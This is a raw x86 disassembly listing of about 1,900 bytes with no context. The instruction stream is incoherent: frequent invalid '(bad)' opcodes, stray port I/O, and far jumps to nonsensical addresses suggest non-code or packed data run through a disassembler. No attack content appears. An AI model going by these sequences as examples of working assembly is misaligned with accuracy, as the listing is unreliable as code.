  41f7b4:	pop    ss
  41f7b5:	jb     0x41f788
  41f7b7:	shl    DWORD PTR [esi+0x20b2935f],1
  41f7bd:	sub    ecx,esp
  41f7bf:	push   ebp
  41f7c0:	shl    cl,1
  41f7c2:	add    BYTE PTR [eax],al
  41f7c4:	add    BYTE PTR [eax],al
  41f7c6:	add    BYTE PTR [ebx+0x1600995f],dl
  41f7cc:	jbe    0x41f7dc
  41f7ce:	jge    0x41f75f
  41f7d0:	test   dh,cl
  41f7d2:	add    ch,BYTE PTR [edi]
  41f7d4:	pop    edi
  41f7d5:	neg    BYTE PTR [ecx]
  41f7d7:	popa   
  41f7d8:	mov    dh,0xed
  41f7da:	jb     0x41f840
  41f7dc:	xor    al,0xe5
  41f7de:	pop    ebp
  41f7df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7e0:	rcl    BYTE PTR [edx+0x5],0x90
  41f7e4:	mov    ah,0x78
  41f7e6:	neg    bl
  41f7e8:	dec    edx
  41f7e9:	or     eax,0xcf759120
  41f7ee:	mov    edi,0xe81a94c8
  41f7f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7f4:	mov    dl,0xe5
  41f7f6:	rol    esi,0x80
  41f7f9:	jbe    0x41f7b8
  41f7fb:	sar    BYTE PTR [eax+0xe],cl
  41f7fe:	cmp    DWORD PTR [edx-0x6c4ca830],edi
  41f804:	mov    dl,0x93
  41f806:	add    BYTE PTR [ecx],bh
  41f808:	rcr    BYTE PTR [eax],0x89
  41f80b:	inc    esi
  41f80c:	imul   edx,DWORD PTR [edx+0x4],0x6b
  41f810:	mov    ah,0xe
  41f812:	add    BYTE PTR [ecx-0x1df6084d],ch
  41f818:	je     0x41f80f
  41f81a:	pop    esp
  41f81b:	pop    es
  41f81c:	scas   eax,DWORD PTR es:[edi]
  41f81d:	push   cs
  41f81e:	xor    ch,BYTE PTR [ecx+0x35c24ae4]
  41f824:	mov    ah,0x41
  41f826:	mov    ebx,ebp
  41f828:	sub    eax,0x10fa
  41f82d:	add    BYTE PTR [eax],al
  41f82f:	add    BYTE PTR [edx-0x55ff1e31],ch
  41f835:	iret   
  41f836:	in     eax,0x0
  41f838:	or     bl,dl
  41f83a:	inc    edx
  41f83b:	push   0x38
  41f83d:	cmp    DWORD PTR [eax-0xc],ebx
  41f840:	mov    ds:0x7e87f540,al
  41f845:	inc    ecx
  41f846:	jmp    0x8d6a:0x10bfb984
  41f84d:	in     eax,0xf6
  41f84f:	sub    BYTE PTR [edx+0x248be1c7],al
  41f855:	mov    esp,0x36f54794
  41f85a:	push   eax
  41f85b:	or     al,0x60
  41f85d:	jp     0x41f7f6
  41f85f:	jne    0x41f83a
  41f861:	cmp    al,0x52
  41f863:	or     al,0x72
  41f865:	test   eax,0x3b860478
  41f86a:	push   edx
  41f86b:	adc    cl,ah
  41f86d:	push   cs
  41f86e:	mov    DWORD PTR [ecx],0x105a36a9
  41f874:	nop
  41f875:	mov    ah,0x97
  41f877:	fmul   DWORD PTR [eax+edi*8-0x1f]
  41f87b:	call   0x2c39c6
  41f880:	and    ch,BYTE PTR [esi+0x4a]
  41f883:	pop    esi
  41f884:	nop
  41f885:	test   BYTE PTR [ecx],ch
  41f887:	rcr    DWORD PTR [ecx+ecx*8-0x5bc21839],0x12
  41f88f:	add    BYTE PTR [edx-0x36],al
  41f892:	mov    eax,0xff
  41f897:	add    BYTE PTR [eax],al
  41f899:	add    edi,eax
  41f89b:	sbb    al,ch
  41f89d:	and    ecx,ebx
  41f89f:	adc    BYTE PTR [eax],al
  41f8a1:	sbb    ebx,DWORD PTR [ecx-0x6c]
  41f8a4:	cmc    
  41f8a5:	in     eax,0xcc
  41f8a7:	shr    eax,1
  41f8a9:	mov    esp,0x910e4171
  41f8ae:	leave  
  41f8af:	xchg   ebp,eax
  41f8b0:	mov    edi,0x52c30bbc
  41f8b5:	stos   BYTE PTR es:[edi],al
  41f8b6:	jp     0x41f916
  41f8b8:	adc    dl,BYTE PTR [esp+ebx*8-0x7720002f]
  41f8bf:	add    al,0x20
  41f8c1:	or     DWORD PTR [ecx],0x12
  41f8c4:	mov    ecx,0x11bc08
  41f8c9:	ret    
  41f8ca:	mov    al,ds:0xd832824
  41f8cf:	adc    bh,ch
  41f8d1:	popf   
  41f8d2:	aad    0x2
  41f8d4:	inc    eax
  41f8d5:	nop
  41f8d6:	jbe    0x41f8eb
  41f8d8:	push   edi
  41f8da:	enter  0x114a,0xf8
  41f8de:	data16 mov cl,0xfe
  41f8e1:	out    0x7b,eax
  41f8e3:	jge    0x41f917
  41f8e5:	test   al,0x5c
  41f8e7:	(bad)  
  41f8e8:	call   esi
  41f8ea:	mov    ch,0x5
  41f8ec:	adc    DWORD PTR [eax-0x37],edx
  41f8ef:	cmp    bl,al
  41f8f1:	cmp    al,0xe3
  41f8f3:	mov    edi,0x4b070b58
  41f8f8:	adc    al,0x8a
  41f8fa:	retf   0x3111
  41f8fd:	add    BYTE PTR [eax],al
  41f8ff:	add    BYTE PTR [eax],al
  41f901:	add    al,dl
  41f903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f904:	push   eax
  41f905:	add    edx,DWORD PTR [eax-0x409f894e]
  41f90b:	lods   eax,DWORD PTR ds:[esi]
  41f90c:	test   DWORD PTR [ebx],0x2b8f5f41
  41f912:	stc    
  41f913:	mov    dl,0xf7
  41f915:	xor    ch,BYTE PTR [ecx+0x62]
  41f918:	xchg   esp,eax
  41f919:	sbb    DWORD PTR [ecx+eiz*4-0x4a1ffbc9],ebx
  41f920:	retf   0x8123
  41f923:	jb     0x41f91c
  41f925:	mov    cl,0x66
  41f927:	sti    
  41f928:	div    bh
  41f92a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f92b:	fwait
  41f92c:	aas    
  41f92d:	daa    
  41f92e:	xor    BYTE PTR [ebx+0x30477af7],0x5d
  41f935:	stc    
  41f936:	lea    esi,[edx+0x3e]
  41f939:	and    bh,BYTE PTR [edi]
  41f93b:	mov    dh,0xf7
  41f93d:	aad    0xe0
  41f93f:	daa    
  41f940:	dec    esp
  41f941:	sub    BYTE PTR [ebx+esi*4],al
  41f944:	test   DWORD PTR [ebx],0x21df91df
  41f94a:	sbb    eax,0x16ff20cb
  41f94f:	mov    dh,0x72
  41f951:	xor    BYTE PTR [ebx-0x6ffc064c],0xca
  41f958:	fld    st(0)
  41f95a:	push   DWORD PTR [ebp-0x4bde4b86]
  41f960:	test   DWORD PTR [ebx],0xfe0fe519
  41f966:	add    BYTE PTR [eax],al
  41f968:	add    BYTE PTR [eax],al
  41f96a:	add    BYTE PTR [eax-0x4d],dh
  41f96d:	test   DWORD PTR [eax-0x25cbc4e1],0x28342783
  41f977:	mov    al,ds:0x60d62763
  41f97c:	popa   
  41f97d:	aam    0x18
  41f97f:	mov    eax,0x130437a0
  41f984:	repz push cs
  41f986:	aaa    
  41f987:	bound  ecx,QWORD PTR [edi+eiz*1+0xd]
  41f98b:	fsubr  DWORD PTR [ebx-0x41ed0a9e]
  41f991:	add    bl,BYTE PTR [esi+ebp*2]
  41f994:	adc    edi,0xf
  41f997:	or     eax,0x10dd526a
  41f99c:	jno    0x41f9d0
  41f99e:	cmc    
  41f99f:	arpl   bx,di
  41f9a1:	mov    edx,0x9ab5480d
  41f9a6:	gs mov bh,0xba
  41f9a9:	push   cs
  41f9aa:	jmp    0xcc1ac442
  41f9af:	out    dx,al
  41f9b0:	mov    dh,0x93
  41f9b2:	sub    DWORD PTR [esi+0x20],edx
  41f9b5:	iret   
  41f9b6:	ins    DWORD PTR es:[edi],dx
  41f9b7:	rol    DWORD PTR [eax+0x18],cl
  41f9ba:	sbb    cl,ah
  41f9bc:	dec    edi
  41f9bd:	xchg   edi,eax
  41f9be:	ins    DWORD PTR es:[edi],dx
  41f9bf:	ja     0x41f97f
  41f9c1:	push   cs
  41f9c2:	jmp    0xe93ef75a
  41f9c7:	xchg   ebx,eax
  41f9c8:	mov    dl,0x9b
  41f9ca:	outs   dx,DWORD PTR gs:[esi]
  41f9cc:	mov    ah,0x10
  41f9ce:	jmp    0x41f9d3
  41f9d3:	add    BYTE PTR [ebx-0x2b56f8d6],dl
  41f9d9:	aas    
  41f9da:	call   0xe2d31143
  41f9df:	jmp    0x680ac77
  41f9e4:	cwde   
  41f9e5:	and    al,BYTE PTR [edx]
  41f9e7:	test   eax,0xcd932993
  41f9ec:	addr16 mov ch,0xed
  41f9ef:	jmp    0x5945afb7
  41f9f4:	xor    BYTE PTR [edx+0xe],0x72
  41f9f8:	inc    esp
  41f9f9:	int    0x80
  41f9fb:	stc    
  41f9fc:	xchg   edx,eax
  41f9fd:	mov    dl,0x92
  41f9ff:	test   eax,0x4356c8
  41fa04:	inc    esp
  41fa05:	fidiv  DWORD PTR [ecx]
  41fa07:	cmp    BYTE PTR [eax],dl
  41fa09:	pop    edi
  41fa0a:	in     eax,dx
  41fa0b:	(bad)  
  41fa0c:	mov    ecx,0xb9e03258
  41fa11:	mov    al,0x97
  41fa13:	xor    eax,0x4ea19d
  41fa18:	xor    al,0x76
  41fa1a:	in     eax,dx
  41fa1b:	(bad)  
  41fa1c:	jns    0x41f9fb
  41fa1e:	jmp    0x1600:0x51c35135
  41fa25:	pop    ebp
  41fa26:	sub    BYTE PTR [edx],al
  41fa28:	push   0x2a750eb0
  41fa2d:	xor    eax,0xb07b5d09
  41fa32:	push   cs
  41fa33:	add    BYTE PTR [edx],bl
  41fa35:	xor    eax,0x2491
  41fa3a:	add    BYTE PTR [eax],al
  41fa3c:	add    BYTE PTR [ebp+0x9000eae],dh
  41fa42:	(bad)  
  41fa44:	mov    WORD PTR [ebp+0x2900ae8a],gs
  41fa4a:	mov    al,0x3e
  41fa4c:	lea    ebx,ds:0xfde8568c
  41fa52:	mov    gs,ebp
  41fa54:	(bad)  
  41fa55:	cld    
  41fa56:	inc    esi
  41fa57:	and    BYTE PTR [eax],ch
  41fa59:	cli    
  41fa5a:	jmp    0x41fa49
  41fa5c:	(bad)  
  41fa5d:	pop    edi
  41fa5e:	adc    DWORD PTR [eax],0x1
  41fa61:	stc    
  41fa62:	scas   eax,DWORD PTR es:[edi]
  41fa63:	(bad)  
  41fa64:	aam    0x34
  41fa66:	cmp    ebx,edx
  41fa68:	call   0x2eb0c1
  41fa6d:	cmp    dh,BYTE PTR [eax+0x4b]
  41fa70:	pop    edi
  41fa71:	add    dh,BYTE PTR [ecx]
  41fa73:	shl    al,cl
  41fa75:	in     eax,dx
  41fa76:	scas   eax,DWORD PTR es:[edi]
  41fa77:	push   cs
  41fa78:	ret    0xafed
  41fa7b:	pop    ebp
  41fa7c:	push   ebx
  41fa7d:	lahf   
  41fa7e:	cmp    DWORD PTR [eax],esp
  41fa80:	sbb    al,0x90
  41fa82:	inc    ebp
  41fa83:	aad    0xff
  41fa85:	or     BYTE PTR [ecx],0xc2
  41fa88:	dec    esi
  41fa89:	pusha  
  41fa8a:	popa   
  41fa8b:	push   ebp
  41fa8c:	into   
  41fa8d:	push   ecx
  41fa8e:	leave  
  41fa8f:	ror    DWORD PTR [eax+0x7a8ff1de],0x91
  41fa96:	leave  
  41fa97:	xlat   BYTE PTR ds:[bx]
  41fa99:	arpl   WORD PTR [ecx],cx
  41fa9b:	ret    0x404e
  41fa9e:	mov    eax,ds:0xd23a
  41faa3:	add    BYTE PTR [eax],al
  41faa5:	add    cl,dl
  41faa7:	leave  
  41faa8:	ror    DWORD PTR [eax+0x7acc3156],0x91
  41faaf:	leave  
  41fab0:	xchg   ebp,eax
  41fab1:	fcom   st(6)
  41fab3:	nop
  41fab4:	in     eax,0x7
  41fab6:	adc    al,0x9
  41fab8:	in     eax,0x3
  41faba:	mov    ds:0xa3c0d909,eax
  41fabf:	mov    ecx,edx
  41fac1:	push   esi
  41fac2:	push   ebx
  41fac3:	(bad)  
  41fac4:	data16 jmp 0x41fad8
  41fac7:	ins    DWORD PTR es:[edi],dx
  41fac8:	inc    ecx
  41fac9:	inc    DWORD PTR [edi-0x37]
  41facc:	mov    esi,0xbe908355
  41fad1:	mov    bl,BYTE PTR ds:0x2ffc7ab9
  41fad7:	inc    edx
  41fad8:	or     BYTE PTR cs:[edx-0x7c],dh
  41fadc:	dec    ecx
  41fadd:	dec    esi
  41fade:	mov    cs,edx
  41fae0:	adc    DWORD PTR [ebx-0x2b46ce43],ecx
  41fae6:	nop
  41fae7:	leave  
  41fae8:	adc    eax,ebp
  41faea:	pop    esi
  41faeb:	test   BYTE PTR [ecx],dl
  41faed:	add    BYTE PTR [eax],cl
  41faef:	push   cs
  41faf0:	jnp    0x41faaf
  41faf2:	xchg   ecx,eax
  41faf3:	leave  
  41faf4:	adc    DWORD PTR [eax-0x2deb9e3],eax
  41fafa:	out    0xc3,eax
  41fafc:	ror    BYTE PTR [edx-0x2b704dab],0x3d
  41fb03:	mov    bl,0xe2
  41fb05:	out    0xa0,eax
  41fb07:	jb     0x41fb00
  41fb09:	add    BYTE PTR [eax],0x0
  41fb0c:	add    BYTE PTR [eax],al
  41fb0e:	add    BYTE PTR [edi],al
  41fb10:	cmp    eax,0xb0c3dc20
  41fb15:	test   DWORD PTR [ebx],0x15039cb5
  41fb1b:	push   eax
  41fb1c:	mov    dl,0x72
  41fb1e:	rcr    DWORD PTR [edi+0x41055161],0x25
  41fb25:	cmp    ecx,DWORD PTR [edi+eax*2-0x780ea1a4]
  41fb2c:	mov    dl,0xea
  41fb2e:	retf   
  41fb2f:	xchg   edi,eax
  41fb30:	repnz test DWORD PTR [eax-0x292cd7c1],0x790905e0
  41fb3b:	adc    ah,bl
  41fb3d:	imul   esp,DWORD PTR fs:[ebx+eax*1+0x7d],0xfffffff1
  41fb43:	addr16 mov dl,0xea
  41fb46:	iret   
  41fb47:	xchg   edx,esi
  41fb49:	idiv   DWORD PTR [esi+0x67]
  41fb4c:	mov    dl,0xca
  41fb4e:	imul   edi,DWORD PTR [esi+ecx*4],0xffffffe1
  41fb52:	dec    esi
  41fb53:	cmp    al,0xc8
  41fb55:	mov    bl,0x13
  41fb57:	shl    BYTE PTR [edx-0x375cb8d3],1
  41fb5d:	jno    0x41fb28
  41fb5f:	and    al,0xb1
  41fb61:	cmp    dh,bl
  41fb63:	pop    ds
  41fb64:	cmp    dl,dl
  41fb66:	push   0xffffff97
  41fb68:	lods   eax,DWORD PTR ds:[esi]
  41fb69:	repnz into 
  41fb6b:	add    DWORD PTR [ecx-0x37],0x2f0d6543
  41fb72:	inc    edi
  41fb73:	add    BYTE PTR [eax],al
  41fb75:	add    BYTE PTR [eax],al
  41fb77:	add    BYTE PTR [edi],ch
  41fb79:	mov    ah,0x0
  41fb7b:	ins    BYTE PTR es:[edi],dx
  41fb7c:	adc    BYTE PTR [edi-0xbda0505],bl
  41fb82:	push   cs
  41fb83:	mov    cl,0xbe
  41fb85:	cmp    cl,al
  41fb87:	xchg   esp,eax
  41fb88:	pop    esi
  41fb89:	add    dl,BYTE PTR [edi]
  41fb8b:	adc    bh,BYTE PTR [edi+0x8]
  41fb8e:	call   0xcab9:0xbdbf8058
  41fb95:	pop    esi
  41fb96:	adc    DWORD PTR [edx+0x59],esp
  41fb99:	push   es
  41fb9a:	cmp    dl,bl
  41fb9c:	xor    al,0x5
  41fb9e:	xor    ebx,ecx
  41fba0:	add    dl,BYTE PTR cs:[ebx]
  41fba3:	bound  esi,QWORD PTR ds:0x96afbdbe
  41fba9:	stos   BYTE PTR es:[edi],al
  41fbaa:	adc    DWORD PTR [eax],esp
  41fbac:	test   BYTE PTR [edx],dh
  41fbae:	push   0xffffffc5
  41fbb0:	mov    bl,0xb2
  41fbb2:	xchg   edi,eax
  41fbb3:	and    eax,0x1597cab0
  41fbb8:	mov    al,0xc6
  41fbba:	(bad)  
  41fbbb:	in     al,dx
  41fbbc:	mul    BYTE PTR [eax]
  41fbbe:	das    
  41fbbf:	xchg   edx,eax
  41fbc0:	nop
  41fbc1:	cmp    esp,ebp
  41fbc3:	bound  esi,QWORD PTR [ecx+edx*8-0x67]
  41fbc7:	adc    bl,BYTE PTR [eax-0x26]
  41fbca:	enter  0xfaf6,0xc
  41fbce:	xor    esi,ebp
  41fbd0:	xchg   esi,eax
  41fbd1:	nop
  41fbd2:	in     eax,dx
  41fbd3:	cld    
  41fbd4:	test   eax,0xf5bee94e
  41fbda:	xor    ah,cl
  41fbdc:	add    BYTE PTR [eax],al
  41fbde:	add    BYTE PTR [eax],al
  41fbe0:	add    BYTE PTR [ebp-0x6b02d90f],dh
  41fbe6:	and    eax,0x229ef230
  41fbeb:	jle    0x41fc4f
  41fbed:	out    0xd4,eax
  41fbef:	(bad)  
  41fbf0:	jae    0x41fb79
  41fbf2:	sar    cl,0xe7
  41fbf5:	lea    esi,[edi-0x92d116a]
  41fbfb:	sub    DWORD PTR [ebx],ebx
  41fbfd:	add    eax,0xf40011a7
  41fc02:	mov    dh,0xe9
  41fc04:	cmp    ebp,edx
  41fc06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc07:	hlt    
  41fc08:	jmp    0x41fc15
  41fc0a:	fst    DWORD PTR [eax]
  41fc0c:	jne    0x41fbe4
  41fc0e:	(bad)  
  41fc10:	jae    0x41fbb5
  41fc12:	das    
  41fc13:	pop    edx
  41fc14:	and    al,0xc9
  41fc16:	daa    
  41fc17:	add    cl,BYTE PTR [esi]
  41fc19:	shr    BYTE PTR [ecx-0x6d48748d],cl
  41fc1f:	xchg   esp,eax
  41fc20:	pop    es
  41fc21:	sub    dh,bl
  41fc23:	jae    0xf269b420
  41fc29:	imul   esp,DWORD PTR [esi],0xf
  41fc2c:	cmc    
  41fc2d:	stos   BYTE PTR es:[edi],al
  41fc2e:	pop    ss
  41fc2f:	daa    
  41fc30:	repz jnp 0x41fc4a
  41fc33:	mul    DWORD PTR [edi]
  41fc35:	ins    DWORD PTR es:[edi],dx
  41fc36:	mov    al,0x60
  41fc38:	and    esp,DWORD PTR [edx+0x27]
  41fc3b:	pop    edi
  41fc3c:	pop    ds
  41fc3d:	repnz push 0x31
  41fc40:	adc    ah,bh
  41fc42:	ret    0xeb1c
  41fc45:	add    BYTE PTR [eax],al
  41fc47:	add    BYTE PTR [eax],al
  41fc49:	add    BYTE PTR [ebx+0x2f],ah
  41fc4c:	adc    al,0x89
  41fc4e:	jbe    0x41fc87
  41fc50:	rol    BYTE PTR [edx+ebp*8],cl
  41fc53:	hlt    
  41fc54:	adc    DWORD PTR [ebx],edi
  41fc56:	mov    ebx,0xe403dfa8
  41fc5b:	mov    ch,0xe9
  41fc5d:	cmp    ebp,edx
  41fc5f:	test   al,0xf0
  41fc61:	pop    edi
  41fc62:	out    dx,eax
  41fc63:	js     0x41fcab
  41fc65:	and    DWORD PTR [ebp-0x56],0xffffffcf
  41fc69:	add    al,0x39
  41fc6b:	xor    eax,0xb4399cf9
  41fc70:	push   cs
  41fc71:	push   ebx
  41fc72:	add    al,0x82
  41fc74:	xchg   esi,eax
  41fc75:	repnz mov al,ds:0x4610316a
  41fc7b:	das    
  41fc7c:	fmul   QWORD PTR [ecx+0x180d4d90]
  41fc82:	call   0xf83edc87
  41fc87:	test   al,0x9e
  41fc89:	xlat   BYTE PTR ds:[ebx]
  41fc8a:	mov    ds:0xc883d2d9,eax
  41fc8f:	cwde   
  41fc90:	ins    BYTE PTR es:[edi],dx
  41fc91:	pop    eax
  41fc92:	xchg   ecx,eax
  41fc93:	cdq    
  41fc94:	adc    DWORD PTR [edx-0x6e],ebp
  41fc97:	jmp    FWORD PTR [ebp-0x28]
  41fc9a:	push   0x10d7ada0
  41fc9f:	inc    esi
  41fca0:	or     eax,0x119990b4
  41fca5:	add    BYTE PTR [esi+eiz*4],bh
  41fca8:	ins    DWORD PTR es:[edi],dx
  41fca9:	xlat   BYTE PTR ds:[ebx]
  41fcaa:	and    al,0xa2
  41fcac:	nop
  41fcad:	loopne 0x41fcaf
  41fcaf:	add    BYTE PTR [eax],al
  41fcb1:	add    BYTE PTR [eax],al
  41fcb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcb4:	push   0x55130011
  41fcb9:	jmp    0xc5bf4948
  41fcbe:	dec    edi
  41fcbf:	ret    
  41fcc0:	push   eax
  41fcc1:	xor    BYTE PTR [esp+ebp*4+0x7d],bh
  41fcc5:	xor    BYTE PTR [esp+esi*4+0x71],bh
  41fcc9:	mov    edi,0xad606530
  41fcce:	and    esp,esp
  41fcd0:	ins    DWORD PTR es:[edi],dx
  41fcd1:	adc    DWORD PTR [eax],eax
  41fcd3:	nop
  41fcd4:	sub    BYTE PTR ds:0x12d98488,bl
  41fcda:	adc    DWORD PTR [eax-0x58],0x6d
  41fcde:	push   cs
  41fcdf:	xchg   ecx,eax
  41fce0:	cdq    
  41fce1:	adc    DWORD PTR [ecx-0x5d4304],ecx
  41fce7:	aas    
  41fce8:	cdq    
  41fce9:	mov    edi,0xdebdcc8a
  41fcee:	dec    edi
  41fcef:	sbb    eax,0xc0440d55
  41fcf4:	call   0x59c66d15
  41fcf9:	adc    DWORD PTR [ebx-0x711b4db0],eax
  41fcff:	dec    edi
  41fd00:	cmp    dh,BYTE PTR [ebx+0x3736a11f]
  41fd06:	out    dx,eax
  41fd07:	cdq    
  41fd08:	cmp    esi,DWORD PTR [ebx-0x421483e1]
  41fd0e:	jmp    FWORD PTR [edx-0x4b]
  41fd11:	pusha  
  41fd12:	imul   edi,DWORD PTR [eax+0x7cfc30],0x0
  41fd19:	add    BYTE PTR [eax],al
  41fd1b:	add    BYTE PTR [ebx-0x2a],dl
  41fd1e:	addr16 sub al,0x8e
  41fd21:	sub    eax,0xdab77afc
  41fd26:	sbb    eax,0xd732d07b
  41fd2b:	add    dl,BYTE PTR [edi]
  41fd2d:	not    BYTE PTR [ebx]
  41fd2f:	or     BYTE PTR [eiz*1+0x427380ad],bh
  41fd36:	test   DWORD PTR [ebx],0x3f7b290
  41fd3c:	jo     0x41fd64
  41fd3e:	mov    edi,0x3b39d031
  41fd43:	and    BYTE PTR [edx-0x5edfc4c8],ah
  41fd49:	ss scas al,BYTE PTR es:[edi]
  41fd4b:	icebp  
  41fd4c:	cmc    
  41fd4d:	ss mov bh,0xf1
  41fd50:	icebp  
  41fd51:	lods   al,BYTE PTR ds:[esi]
  41fd52:	mov    bh,0x5d
  41fd54:	xor    BYTE PTR [ebx+0x3fbe03f7],dh
  41fd5a:	jnp    0x41fd7c
  41fd5c:	adc    al,0xb3
  41fd5e:	test   DWORD PTR [ebx],0x1fbb3fc0
  41fd64:	test   BYTE PTR [edx],al
  41fd66:	dec    ebp
  41fd67:	adc    eax,eax
  41fd69:	(bad)  
  41fd6a:	mov    bh,0x3
  41fd6c:	adc    esi,DWORD PTR [ebx-0x34]
  41fd6f:	nop
  41fd70:	idiv   DWORD PTR [edx]
  41fd72:	mov    ebx,0x3736821f
  41fd77:	lock pop ebx
  41fd79:	cmp    cl,BYTE PTR [esi]
  41fd7b:	ins    DWORD PTR es:[edi],dx
  41fd7c:	jo     0x41fdb4
  41fd7e:	push   cs
  41fd7f:	jmp    0x41fd84
  41fd84:	add    BYTE PTR [ebx-0x712ab15],dl
  41fd8a:	mov    dh,0x39
  41fd8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd8d:	pop    es
  41fd8e:	xor    eax,0x3b9fcd52
  41fd93:	xchg   edx,eax
  41fd94:	lds    edx,FWORD PTR [ebx]
  41fd96:	scas   al,BYTE PTR es:[edi]
  41fd97:	in     eax,dx
  41fd98:	jmp    0xda74f706
  41fd9d:	mov    edx,0x7aef6bb4
  41fda2:	mov    ah,0x97
  41fda4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fda5:	ja     0x41fd79
  41fda7:	cwde   
  41fda8:	sub    eax,0x8bf9c070
  41fdad:	dec    ecx
  41fdae:	stc    
  41fdaf:	xor    bh,dl
  41fdb1:	cmp    DWORD PTR [esi+edx*4+0x25],ebp
  41fdb5:	jo     0x41fd77
  41fdb7:	stc    
  41fdb8:	pop    edi
  41fdb9:	leave  
  41fdba:	lods   eax,DWORD PTR ds:[esi]
  41fdbb:	in     al,dx
  41fdbc:	aam    0x77
  41fdbe:	ror    DWORD PTR [esi-0x17],0x1c
  41fdc2:	icebp  
  41fdc3:	xor    al,BYTE PTR [ecx]
  41fdc5:	adc    DWORD PTR [esi+0x62],ebp
  41fdc8:	fbld   TBYTE PTR [ebx-0x52]
  41fdcb:	add    eax,ecx
  41fdcd:	mov    ds:0x3620ef2,eax
  41fdd2:	scas   eax,DWORD PTR es:[edi]
  41fdd3:	(bad)  
  41fdd4:	lds    ebx,FWORD PTR [ebx-0x7f79f0e8]
  41fdda:	out    dx,al
  41fddb:	add    ebp,DWORD PTR [ecx]
  41fddd:	mov    WORD PTR [ecx],?
  41fddf:	in     al,0xfd
  41fde1:	mov    BYTE PTR [ebx],bh
  41fde3:	push   edx
  41fde4:	lds    eax,FWORD PTR [edi+0x55eaf]
  41fdea:	add    BYTE PTR [eax],al
  41fdec:	add    BYTE PTR [eax],al
  41fdee:	pop    esi
  41fdef:	scas   al,BYTE PTR es:[edi]
  41fdf0:	add    esi,DWORD PTR ds:0x600ef2a3
  41fdf6:	call   eax
  41fdf8:	ss shl DWORD PTR fs:[eax],cl
  41fdfc:	add    eax,0x1140f00
  41fe01:	int3   
  41fe02:	dec    ecx
  41fe03:	jno    0x41fdf2
  41fe05:	xor    DWORD PTR [ecx+0x74],ebp
  41fe08:	dec    ebx
  41fe09:	pop    ebp
  41fe0a:	add    dh,BYTE PTR [esi]
  41fe0c:	rcr    DWORD PTR [ecx+edi*8+0x1c20eb0],1
  41fe13:	mov    cl,0x74
  41fe15:	and    DWORD PTR ds:0xd6000acd,0x2c
  41fe1c:	mov    ebp,0x97b0f901
  41fe21:	inc    esp
  41fe22:	int    0xb8
  41fe24:	(bad)  
  41fe25:	fs int 0x78
  41fe28:	in     eax,dx
  41fe29:	or     BYTE PTR ds:0x40004acd,0x72
  41fe30:	xor    DWORD PTR [eax+0x42],edx
  41fe33:	jb     0x41fe66
  41fe35:	xor    al,0x92
  41fe37:	jb     0x41fe6a
  41fe39:	sub    al,0x9a
  41fe3b:	sti    
  41fe3c:	xchg   esp,eax
  41fe3d:	inc    esp
  41fe3e:	popf   
  41fe3f:	xchg   esi,eax
  41fe40:	xchg   esi,eax
  41fe41:	inc    esp
  41fe42:	(bad)  
  41fe43:	fidiv  WORD PTR [edi]
  41fe45:	inc    esp
  41fe46:	(bad)  
  41fe47:	out    0x4f,al
  41fe49:	mov    DWORD PTR [ebp-0x2e],ebp
  41fe4c:	jb     0x41fddb
  41fe4e:	mov    ebp,0x505ad2
  41fe53:	add    BYTE PTR [eax],al
  41fe55:	add    BYTE PTR [eax],al
  41fe57:	fsubr  QWORD PTR es:[edx+0x69]
  41fe5b:	lods   eax,DWORD PTR ds:[esi]
  41fe5c:	mov    dh,0x95
  41fe5e:	je     0x41fead
  41fe60:	je     0x41fdf6
  41fe62:	pop    esp
  41fe63:	pop    ebp
  41fe64:	mov    al,ds:0xbf8515ea
  41fe69:	dec    esi
  41fe6a:	add    BYTE PTR [ecx],ah
  41fe6c:	je     0x41fe9f
  41fe6e:	adc    esi,DWORD PTR [esi]
  41fe70:	sub    eax,0xb0390098
  41fe75:	cdq    
  41fe76:	inc    esp
  41fe77:	(bad)  
  41fe78:	fidivr DWORD PTR [esi]
  41fe7a:	lea    edx,[eax-0x1fcff2a3]
  41fe80:	cld    
  41fe81:	sbb    eax,0x11598468
  41fe86:	adc    DWORD PTR [eax+0x67],0xfffffffb
  41fe8a:	push   ebp
  41fe8b:	pop    ds
  41fe8c:	(bad)  
  41fe8d:	sub    eax,0x6899d00f
  41fe92:	inc    ebx
  41fe93:	mov    ah,0xb5
  41fe95:	ins    DWORD PTR es:[edi],dx
  41fe96:	jmp    0x9084:0xfc6c957d
  41fe9d:	(bad)  
  41fe9e:	call   FWORD PTR [esi+0x66]
  41fea1:	(bad)  
  41fea3:	test   DWORD PTR ds:0x20904003,eax
  41fea9:	mul    DWORD PTR [ebx]
  41feab:	test   BYTE PTR [edi],ch
  41fead:	adc    DWORD PTR [ebx-0x772e8ac4],ecx
  41feb3:	fild   WORD PTR [ecx-0x733804bc]
  41feb9:	imul   ax,WORD PTR [eax],0x0
  41febd:	add    BYTE PTR [eax],al
  41febf:	add    BYTE PTR [ecx+eiz*4-0x39],dh
  41fec3:	jmp    DWORD PTR [edx-0xf]
  41fec6:	ins    DWORD PTR es:[edi],dx
  41fec7:	jmp    FWORD PTR [edi+0x4cc5dc99]
  41fecd:	mov    ch,0xd6
  41fecf:	call   FWORD PTR [esi+0x5012ed8e]
  41fed5:	cdq    
  41fed6:	xchg   ecx,eax
  41fed7:	jnp    0x41fe8d
  41fed9:	in     eax,0x12
  41fedb:	jae    0x41fe74
  41fedd:	mov    edi,0xace85610
  41fee2:	push   cs
  41fee3:	add    BYTE PTR [eax-0x7bed8c1a],dl
  41fee9:	mov    ss,ecx
  41feeb:	inc    edx
  41feed:	push   ds
  41feee:	fisub  WORD PTR [ebx]
  41fef0:	rcl    BYTE PTR [eax],1
  41fef2:	and    esp,edi
  41fef4:	and    ebx,DWORD PTR ds:0xb24ffc73
  41fefa:	retf   
  41fefb:	pop    ds
  41fefc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fefd:	add    al,0x4d
  41feff:	push   cs
  41ff00:	dec    eax
  41ff01:	ret    0x3b7
  41ff04:	sub    DWORD PTR [edx-0x398c1890],edi
  41ff0a:	pusha  
  41ff0b:	xlat   BYTE PTR ds:[ebx]
  41ff0c:	jae    0x41fed8
  41ff0e:	bswap  eax
  41ff10:	jae    0x41fed2
